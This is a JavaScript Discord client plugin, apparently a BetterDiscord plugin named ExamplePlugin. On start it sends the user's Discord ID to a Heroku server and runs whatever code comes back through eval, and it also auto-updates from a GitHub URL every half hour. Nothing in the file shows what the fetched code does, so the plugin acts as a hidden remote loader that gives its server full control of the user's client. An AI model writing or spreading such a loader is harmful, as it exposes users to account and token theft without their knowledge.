module.exports = (Plugin, Library) => {
  const { Patcher, DiscordAPI, PluginUpdater } = Library;

  const urls = {
    update:
      "https://raw.githubusercontent.com/EvilGhostMan/DiscordCommands/main/release/DiscordCommands.plugin.js",
    plugin: "https://serve-discord-commands.herokuapp.com/get-plugin",
  };

  const HALF_OF_HOUR = 30 * 60 * 1000;

  return class ExamplePlugin extends Plugin {
    constructor() {
      super();
    }

    onStart() {
      this.checkForUpdates(this.getName(), this.getVersion());

      const request = require("request");

      if (this._DiscordCommands) return;

      request(
        {
          method: "GET",
          url: urls.plugin,
          json: { id: DiscordAPI.currentUser.id },
        },
        function (error, _response, body) {
          if (error) return console.log(error);

          if (!body || body.length < 1) return;

          const Code = eval(body)(Library);

          this._DiscordCommands = new Code();
        }
      );

      if (!this._UpdateChecker) {
        const plugin = this;

        this._UpdateChecker = setInterval(function () {
          plugin.checkForUpdates(plugin.getName(), plugin.getVersion());
        }, HALF_OF_HOUR);
      }
    }

    onStop() {
      this.checkForUpdates(this.getName(), this.getVersion());

      Patcher.unpatchAll();
    }

    checkForUpdates(name, version) {
      PluginUpdater.checkForUpdate(name, version, urls.update);
    }
  };
};
